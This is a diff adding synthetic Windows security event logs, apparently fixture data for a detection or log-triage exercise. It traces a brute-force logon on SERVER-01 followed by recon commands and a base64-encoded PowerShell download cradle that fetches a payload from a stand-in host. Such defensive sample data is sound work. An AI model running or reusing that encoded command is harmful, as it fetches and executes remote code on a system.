@@ -1,0 +1,167 @@
+[
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-25T08:01:00Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "alice",
+    "LogonType": 2,
+    "IpAddress": "10.0.0.5",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Successful logon"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-25T08:03:00Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "alice",
+    "LogonType": 2,
+    "IpAddress": "10.0.0.5",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Failed logon — typo, one attempt"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-25T09:10:00Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "203.0.113.55",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Failed logon from external IP"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-25T09:10:05Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "203.0.113.55",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Failed logon from external IP"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-25T09:10:10Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "203.0.113.55",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Failed logon from external IP"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-25T09:10:15Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "203.0.113.55",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Failed logon from external IP"
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-25T09:10:20Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "203.0.113.55",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Successful logon after 4 failures — brute force win"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-25T08:05:00Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "alice",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "C:\\Program Files\\Google\\Chrome\\chrome.exe",
+    "CommandLine": "chrome.exe --new-window",
+    "Description": "Normal process — user opened Chrome"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-25T08:06:00Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "alice",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Description": "Normal process — opened notepad"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-25T09:15:00Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami && net user",
+    "Description": "Suspicious — recon commands after brute force logon"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-25T09:16:00Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABhAHkAbABvAGEAZAAiACkA",
+    "Description": "CRITICAL — PowerShell encoded command, likely download cradle"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-25T09:30:00Z",
+    "Computer": "WORKSTATION-02",
+    "SubjectUserName": "bob",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe Get-Process",
+    "Description": "Normal — admin running a basic PowerShell command"
+  },
+  {
+    "EventID": 4648,
+    "TimeCreated": "2026-03-25T09:17:00Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 3,
+    "IpAddress": "10.0.0.20",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Explicit credential use — possible lateral movement"
+  },
+  {
+    "EventID": 4672,
+    "TimeCreated": "2026-03-25T08:01:05Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "alice",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Special privileges assigned at logon — alice is an admin"
+  },
+  {
+    "EventID": 4672,
+    "TimeCreated": "2026-03-25T09:10:22Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "LogonType": 0,
+    "IpAddress": "",
+    "ProcessName": "",
+    "CommandLine": "",
+    "Description": "Special privileges assigned after brute force logon"
+  }
+]
